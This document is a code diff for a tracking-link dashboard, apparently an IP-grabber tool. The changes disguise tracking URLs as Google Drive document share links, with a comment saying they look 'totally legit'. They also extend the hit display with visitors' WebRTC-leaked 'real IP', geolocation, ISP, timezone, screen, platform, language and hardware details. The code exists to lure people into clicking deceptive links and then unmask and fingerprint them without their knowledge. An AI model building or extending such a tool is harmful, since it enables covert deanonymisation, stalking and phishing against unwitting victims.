@@ -1114,7 +1114,15 @@ document.getElementById("link-gen").addEventListener("click", async () => {
   const tag = document.getElementById("link-tag").value.trim() || "untagged";
   const slug = Math.random().toString(36).slice(2, 8);
 
-  // Fetch public tunnel URL (localtunnel gives us a real internet-accessible URL)
+  // Generate a convincing Google-Drive-style document ID (looks totally legit)
+  const chars =
+    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
+  const docId = Array.from(
+    { length: 44 },
+    () => chars[Math.floor(Math.random() * chars.length)],
+  ).join("");
+
+  // Fetch public tunnel URL
   let baseUrl = location.origin;
   try {
     const tr = await fetch(`${location.origin}/api/tunnel-url`);
@@ -1126,15 +1134,15 @@ document.getElementById("link-gen").addEventListener("click", async () => {
     /* use localhost fallback */
   }
 
-  // Tracking URL — points to public URL which captures real visitor IP
-  const trackUrl = `${baseUrl}/t/${slug}`;
+  // Tracking URL — looks like a Google Drive doc share link
+  const trackUrl = `${baseUrl}/d/${docId}`;
 
-  // Register campaign with server so it knows where to redirect
+  // Register campaign with server
   try {
     await fetch(`${location.origin}/t/${slug}/register`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ target, tag }),
+      body: JSON.stringify({ target, tag, docId }),
     });
   } catch {
     /* server may not be running — graceful fallback */
@@ -1191,13 +1199,23 @@ async function handleLTHit(slug, tag, hit) {
     const card = document.createElement("div");
     card.style.cssText =
       "background:#0a0f18;border:1px solid rgba(255,46,110,.35);border-radius:6px;padding:8px 10px;margin-bottom:6px;font-size:11px;";
+    const webrtcLine =
+      hit.webrtcIps && hit.webrtcIps.length
+        ? `<div class="kv"><span class="k" style="color:#ff2e6e">REAL IP (WebRTC)</span><span class="v" style="color:#ff2e6e;font-weight:700">${escapeHtml(hit.webrtcIps.join(", "))}</span></div>`
+        : "";
     card.innerHTML = `
           <div style="color:#ff2e6e;font-weight:700;letter-spacing:1px;margin-bottom:4px">⚡ HIT DETECTED</div>
           <div class="kv"><span class="k">IP ADDRESS</span><span class="v" style="color:#fff;font-weight:700;font-size:13px">${escapeHtml(ip)}</span></div>
+          ${webrtcLine}
           ${d ? `<div class="kv"><span class="k">LOCATION</span><span class="v">${escapeHtml([d.city, d.region, d.country_code].filter(Boolean).join(", "))}</span></div>` : ""}
           ${d?.org ? `<div class="kv"><span class="k">ORG / ISP</span><span class="v">${escapeHtml(d.org)}</span></div>` : ""}
           ${d?.asn ? `<div class="kv"><span class="k">ASN</span><span class="v">${escapeHtml(d.asn)}</span></div>` : ""}
-          ${hit.ua ? `<div class="kv"><span class="k">USER AGENT</span><span class="v" style="word-break:break-all;font-size:9px;opacity:.7">${escapeHtml(hit.ua.slice(0, 120))}</span></div>` : ""}
+          ${hit.tz ? `<div class="kv"><span class="k">TIMEZONE</span><span class="v">${escapeHtml(hit.tz)}</span></div>` : ""}
+          ${hit.screen ? `<div class="kv"><span class="k">SCREEN</span><span class="v">${escapeHtml(hit.screen)} · ${escapeHtml(String(hit.depth || "?"))}bit</span></div>` : ""}
+          ${hit.platform ? `<div class="kv"><span class="k">PLATFORM</span><span class="v">${escapeHtml(hit.platform)}</span></div>` : ""}
+          ${hit.lang ? `<div class="kv"><span class="k">LANGUAGE</span><span class="v">${escapeHtml(hit.lang)}</span></div>` : ""}
+          ${hit.cores ? `<div class="kv"><span class="k">CPU CORES</span><span class="v">${escapeHtml(String(hit.cores))}${hit.mem ? " · " + hit.mem + "GB RAM" : ""}</span></div>` : ""}
+          ${hit.ua ? `<div class="kv"><span class="k">USER AGENT</span><span class="v" style="word-break:break-all;font-size:9px;opacity:.7">${escapeHtml(hit.ua.slice(0, 160))}</span></div>` : ""}
           <div class="kv"><span class="k">TIMESTAMP</span><span class="v">${escapeHtml(hit.ts || "")}</span></div>`;
     hitsEl.prepend(card);
   }
